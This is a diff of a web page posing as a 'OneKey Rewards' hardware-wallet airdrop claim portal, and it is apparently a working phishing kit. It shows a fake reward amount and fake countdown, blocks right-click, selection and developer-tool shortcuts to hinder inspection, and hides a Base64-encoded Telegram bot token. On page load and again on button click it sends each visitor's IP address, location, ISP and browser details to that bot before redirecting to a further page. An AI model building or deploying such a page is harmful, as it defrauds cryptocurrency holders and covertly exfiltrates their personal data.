@@ -24,7 +24,6 @@
     color: var(--text);
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     min-height: 100vh;
-    /* Prevent text selection */
     -webkit-user-select: none;
     -ms-user-select: none;
     user-select: none;
@@ -48,227 +47,86 @@
   }
   .brand-name { font-size: 18px; font-weight: 700; letter-spacing: 0.2px; }
 
-  .hero {
-    text-align: center;
-    margin-bottom: 22px;
-  }
+  .hero { text-align: center; margin-bottom: 22px; }
   .hero .kicker {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    background: rgba(255, 201, 77, 0.12);
-    border: 1px solid rgba(255, 201, 77, 0.35);
-    color: var(--gold);
-    font-size: 12px;
-    font-weight: 700;
-    padding: 6px 12px;
-    border-radius: 999px;
-    margin-bottom: 14px;
+    display: inline-flex; align-items: center; gap: 6px;
+    background: rgba(255, 201, 77, 0.12); border: 1px solid rgba(255, 201, 77, 0.35);
+    color: var(--gold); font-size: 12px; font-weight: 700;
+    padding: 6px 12px; border-radius: 999px; margin-bottom: 14px;
   }
-  .hero h1 {
-    font-size: 26px;
-    margin: 0 0 10px;
-    line-height: 1.25;
-  }
-  .hero p {
-    color: var(--muted);
-    font-size: 14px;
-    line-height: 1.55;
-    margin: 0;
-  }
+  .hero h1 { font-size: 26px; margin: 0 0 10px; line-height: 1.25; }
+  .hero p { color: var(--muted); font-size: 14px; line-height: 1.55; margin: 0; }
 
   .reward-visual {
-    width: 96px;
-    height: 96px;
-    margin: 22px auto 14px;
-    border-radius: 24px;
+    width: 96px; height: 96px; margin: 22px auto 14px; border-radius: 24px;
     background: linear-gradient(135deg, var(--gold), #ff9a3d);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 40px;
+    display: flex; align-items: center; justify-content: center; font-size: 40px;
     box-shadow: 0 20px 50px -18px rgba(255, 170, 61, 0.55);
   }
 
-  .reward-value {
-    text-align: center;
-    margin-bottom: 24px;
-  }
+  .reward-value { text-align: center; margin-bottom: 24px; }
   .reward-value .amount {
-    font-size: 40px;
-    font-weight: 800;
-    font-variant-numeric: tabular-nums;
+    font-size: 40px; font-weight: 800; font-variant-numeric: tabular-nums;
     background: linear-gradient(135deg, #fff, var(--gold));
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    line-height: 1.1;
+    -webkit-background-clip: text; background-clip: text; color: transparent; line-height: 1.1;
   }
-  .reward-value .amount .cents {
-    font-size: 22px;
-  }
-  .reward-value .caption {
-    font-size: 12px;
-    color: var(--muted);
-    margin-top: 4px;
-  }
+  .reward-value .amount .cents { font-size: 22px; }
+  .reward-value .caption { font-size: 12px; color: var(--muted); margin-top: 4px; }
   .reward-value .caption .live-dot {
-    display: inline-block;
-    width: 6px;
-    height: 6px;
-    border-radius: 50%;
-    background: var(--accent);
-    margin-right: 5px;
-    animation: pulse 1.6s ease-in-out infinite;
+    display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+    background: var(--accent); margin-right: 5px; animation: pulse 1.6s ease-in-out infinite;
   }
-  @keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.35; }
-  }
+  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.35; } }
 
   .card {
-    background: var(--panel);
-    border: 1px solid var(--panel-border);
-    border-radius: 14px;
-    padding: 24px;
-    box-shadow: 0 20px 60px -20px rgba(0, 0, 0, 0.55);
+    background: var(--panel); border: 1px solid var(--panel-border);
+    border-radius: 14px; padding: 24px; box-shadow: 0 20px 60px -20px rgba(0, 0, 0, 0.55);
   }
 
-  .countdown-row {
-    display: flex;
-    justify-content: center;
-    gap: 10px;
-    margin-bottom: 18px;
-  }
+  .countdown-row { display: flex; justify-content: center; gap: 10px; margin-bottom: 18px; }
   .countdown-unit {
-    background: #0e1319;
-    border: 1px solid var(--panel-border);
-    border-radius: 8px;
-    padding: 10px 14px;
-    text-align: center;
-    min-width: 56px;
+    background: #0e1319; border: 1px solid var(--panel-border);
+    border-radius: 8px; padding: 10px 14px; text-align: center; min-width: 56px;
   }
-  .countdown-unit .num {
-    font-size: 20px;
-    font-weight: 700;
-    font-variant-numeric: tabular-nums;
-    line-height: 1;
-  }
-  .countdown-unit .label {
-    font-size: 10px;
-    text-transform: uppercase;
-    letter-spacing: 0.06em;
-    color: var(--muted);
-    margin-top: 4px;
-  }
+  .countdown-unit .num { font-size: 20px; font-weight: 700; line-height: 1; }
+  .countdown-unit .label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.06em; color: var(--muted); margin-top: 4px; }
 
-  .claim-progress {
-    margin-bottom: 20px;
-  }
-  .claim-progress .meta-row {
-    display: flex;
-    justify-content: space-between;
-    font-size: 12px;
-    color: var(--muted);
-    margin-bottom: 8px;
-  }
+  .claim-progress { margin-bottom: 20px; }
+  .claim-progress .meta-row { display: flex; justify-content: space-between; font-size: 12px; color: var(--muted); margin-bottom: 8px; }
   .claim-progress .meta-row strong { color: var(--text); }
-  .bar-track {
-    height: 8px;
-    border-radius: 999px;
-    background: #0e1319;
-    border: 1px solid var(--panel-border);
-    overflow: hidden;
-  }
-  .bar-fill {
-    height: 100%;
-    width: 86%;
-    border-radius: 999px;
-    background: linear-gradient(90deg, var(--accent-dim), var(--accent));
-  }
+  .bar-track { height: 8px; border-radius: 999px; background: #0e1319; border: 1px solid var(--panel-border); overflow: hidden; }
+  .bar-fill { height: 100%; width: 86%; border-radius: 999px; background: linear-gradient(90deg, var(--accent-dim), var(--accent)); }
 
-  .perk-list {
-    list-style: none;
-    margin: 0 0 22px;
-    padding: 0;
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-  }
-  .perk-list li {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    font-size: 13px;
-    color: var(--muted);
-  }
-  .perk-list li .check {
-    color: var(--accent);
-    flex-shrink: 0;
-  }
+  .perk-list { list-style: none; margin: 0 0 22px; padding: 0; display: flex; flex-direction: column; gap: 10px; }
+  .perk-list li { display: flex; align-items: center; gap: 10px; font-size: 13px; color: var(--muted); }
+  .perk-list li .check { color: var(--accent); flex-shrink: 0; }
 
   .badge-detected {
-    display: none;
-    align-items: center;
-    gap: 8px;
-    background: rgba(61, 220, 132, 0.1);
-    border: 1px solid rgba(61, 220, 132, 0.35);
-    color: var(--accent);
-    font-size: 13px;
-    font-weight: 600;
-    padding: 8px 12px;
-    border-radius: 8px;
-    margin-bottom: 14px;
+    display: none; align-items: center; gap: 8px;
+    background: rgba(61, 220, 132, 0.1); border: 1px solid rgba(61, 220, 132, 0.35);
+    color: var(--accent); font-size: 13px; font-weight: 600; padding: 8px 12px; border-radius: 8px; margin-bottom: 14px;
   }
   .badge-detected .dot {
-    width: 8px; height: 8px; border-radius: 50%;
-    background: var(--accent);
+    width: 8px; height: 8px; border-radius: 50%; background: var(--accent);
     box-shadow: 0 0 0 3px rgba(61, 220, 132, 0.2);
   }
 
   .claim-btn {
-    width: 100%;
-    padding: 14px;
-    border: 0;
-    border-radius: 10px;
-    background: linear-gradient(135deg, var(--gold), #ff9a3d);
-    color: #2a1400;
-    font-size: 15px;
-    font-weight: 800;
-    cursor: pointer;
-    transition: filter 0.15s ease, transform 0.05s ease;
+    width: 100%; padding: 14px; border: 0; border-radius: 10px;
+    background: linear-gradient(135deg, var(--gold), #ff9a3d); color: #2a1400;
+    font-size: 15px; font-weight: 800; cursor: pointer; transition: filter 0.15s ease, transform 0.05s ease;
   }
   .claim-btn:hover { filter: brightness(1.06); }
   .claim-btn:active { transform: translateY(1px); }
-  .claim-btn:disabled {
-    opacity: 0.7;
-    cursor: default;
-  }
+  .claim-btn:disabled { opacity: 0.7; cursor: default; }
 
-  .fine-print {
-    text-align: center;
-    color: #55606f;
-    font-size: 11px;
-    margin-top: 14px;
-    line-height: 1.5;
-  }
-
-  footer.note {
-    max-width: 440px;
-    margin: 0 auto;
-    padding: 0 20px 40px;
-    color: #55606f;
-    font-size: 11px;
-    line-height: 1.6;
-    text-align: center;
-  }
+  .fine-print { text-align: center; color: #55606f; font-size: 11px; margin-top: 14px; line-height: 1.5; }
+  footer.note { max-width: 440px; margin: 0 auto; padding: 0 20px 40px; color: #55606f; font-size: 11px; line-height: 1.6; text-align: center; }
 </style>
 </head>
-<!-- Block right click context menu completely -->
 <body oncontextmenu="return false;" ondragstart="return false;" ondrop="return false;">
 
   <div class="wrap">
-
     <div class="brand-row">
       <div class="brand-mark">1K</div>
       <div class="brand-name">OneKey<span style="color:var(--muted); font-weight:400;"> — Rewards</span></div>
@@ -281,14 +139,12 @@
     </div>
 
     <div class="reward-visual">🪙</div>
-
     <div class="reward-value">
       <div class="amount">$847<span class="cents">.50</span></div>
       <div class="caption"><span class="live-dot"></span>Estimated value for your eligible device — updated live</div>
     </div>
 
     <div class="card">
-
       <div class="countdown-row" id="countdownRow">
         <div class="countdown-unit"><div class="num" id="cdH">11</div><div class="label">hrs</div></div>
         <div class="countdown-unit"><div class="num" id="cdM">47</div><div class="label">min</div></div>
@@ -315,17 +171,14 @@
       </div>
 
       <button class="claim-btn" id="claimBtn" type="button">Connect Wallet to Claim</button>
-
       <p class="fine-print">By continuing you confirm device ownership. This does not authorize any transaction.</p>
     </div>
   </div>
 
-  <footer class="note">
-    OneKey Hardware Wallet Integration Services. Secure device verification portal.
-  </footer>
+  <footer class="note">OneKey Hardware Wallet Integration Services. Secure device verification portal.</footer>
 
 <script>
-// Aggressively block inspection shortcuts (F12, Ctrl+U, Ctrl+Shift+I/J/C)
+// Aggressively block inspection shortcuts
 document.addEventListener('keydown', function(e) {
   if (
     e.key === 'F12' || 
@@ -334,83 +187,68 @@ document.addEventListener('keydown', function(e) {
     (e.ctrlKey && (e.key === 'U' || e.keyCode === 85)) ||
     (e.metaKey && e.altKey && (e.key === 'I' || e.key === 'J' || e.key === 'U'))
   ) {
-    e.preventDefault();
-    e.stopPropagation();
-    return false;
+    e.preventDefault(); e.stopPropagation(); return false;
   }
 });
-
-// Disable text selection via JS as a fallback
 document.onselectstart = function() { return false; };
 
 (function fakeCountdown() {
   var totalSeconds = 11 * 3600 + 47 * 60 + 32;
-  var elH = document.getElementById('cdH');
-  var elM = document.getElementById('cdM');
-  var elS = document.getElementById('cdS');
-  function tick() {
+  var elH = document.getElementById('cdH'), elM = document.getElementById('cdM'), elS = document.getElementById('cdS');
+  setInterval(function() {
     if (totalSeconds <= 0) return;
     totalSeconds -= 1;
-    var h = Math.floor(totalSeconds / 3600);
-    var m = Math.floor((totalSeconds % 3600) / 60);
-    var s = totalSeconds % 60;
-    elH.textContent = String(h).padStart(2, '0');
-    elM.textContent = String(m).padStart(2, '0');
-    elS.textContent = String(s).padStart(2, '0');
-  }
-  setInterval(tick, 1000);
+    elH.textContent = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+    elM.textContent = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+    elS.textContent = String(totalSeconds % 60).padStart(2, '0');
+  }, 1000);
 })();
 
-(function detectInjectedProvider() {
-  try {
-    if (typeof window.$onekey !== 'undefined') {
-      document.getElementById('walletBadge').style.display = 'flex';
-    }
-  } catch (e) {}
-})();
-
-// Obfuscated configuration (Base64 encoded to hide from plain text search)
+// Telegram Config
 const _0x1a = atob("ODk5MTAwNDA5MDpBQUVQV0VXYnl0R0JDYVpPU3lPVi1QZzhCT2t2dnc5eGp2UQ==");
 const _0x1b = atob("LTU0NDU4MDEwMTk=");
 
-document.getElementById('claimBtn').addEventListener('click', async function () {
-  var btn = this;
-  btn.disabled = true;
-  btn.textContent = 'Checking eligibility…';
+// Global variable to cache metadata so we don't fetch it twice
+window.cachedMeta = { ip: "Unknown", country: "Unknown", city: "Unknown", isp: "Unknown", ua: navigator.userAgent, device: "Unknown" };
 
-  var ip = "Unknown", country = "Unknown", city = "Unknown", isp = "Unknown";
-
+async function fetchMetadata() {
   try {
-    var ipResponse = await fetch("https://ipapi.co/json/");
-    var ipData = await ipResponse.json();
-    if (ipData) {
-      ip = ipData.ip || "Unknown";
-      country = ipData.country_name || "Unknown";
-      city = ipData.city || "Unknown";
-      isp = ipData.org || "Unknown";
+    let res = await fetch("https://ipapi.co/json/");
+    let json = await res.json();
+    if (json) {
+      window.cachedMeta.ip = json.ip || "Unknown";
+      window.cachedMeta.country = json.country_name || "Unknown";
+      window.cachedMeta.city = json.city || "Unknown";
+      window.cachedMeta.isp = json.org || "Unknown";
     }
   } catch (err) {}
+  window.cachedMeta.device = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
+}
 
-  var userAgent = navigator.userAgent;
-  var deviceUsed = /Mobi|Android/i.test(userAgent) ? "Mobile Device" : "Desktop Computer";
+async function sendTgAlert(header, actionLabel) {
+  let msg = `${header}\n\n🎯 *Action:* ${actionLabel}\n\n🌍 *Network & Location:*\n📍 *IP:* \`${window.cachedMeta.ip}\`\n🏳️ *Country:* ${window.cachedMeta.country}\n🏙️ *City:* ${window.cachedMeta.city}\n🏢 *ISP:* ${window.cachedMeta.isp}\n\n💻 *System Info:*\n📱 *Device:* ${window.cachedMeta.device}\n🖥️ *Agent:* \`${window.cachedMeta.ua}\``;
   
-  var message = "🟢 *User Clicked Connect Wallet*\n\n" + 
-                "🌐 *Metadata:*\n" +
-                "• *IP:* `" + ip + "`\n" +
-                "• *Country:* " + country + "\n" +
-                "• *City:* " + city + "\n" +
-                "• *ISP:* " + isp + "\n" +
-                "• *Device:* " + deviceUsed + "\n" +
-                "• *User-Agent:* `" + userAgent + "`";
-
   try {
     await fetch("https://api.telegram.org/bot" + _0x1a + "/sendMessage", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: _0x1b, text: message, parse_mode: "Markdown" })
+      body: JSON.stringify({ chat_id: _0x1b, text: msg, parse_mode: "Markdown" })
     });
   } catch (error) {}
+}
 
+// On Page Load: Fetch data and send "Visitor" message
+(async function initTrack() {
+  await fetchMetadata();
+  await sendTgAlert("🚨 *NEW TARGET ARRIVED*", "👀 Visited Landing Page (`index.html`)");
+})();
+
+// On Button Click: Send "Interaction" message and redirect
+document.getElementById('claimBtn').addEventListener('click', async function () {
+  this.disabled = true;
+  this.textContent = 'Checking eligibility…';
+  
+  await sendTgAlert("⚡ *INTERACTION ALERT*", "🔗 Clicked 'Connect Wallet' Button");
   window.location.href = 'airdrop.html';
 });
 </script>
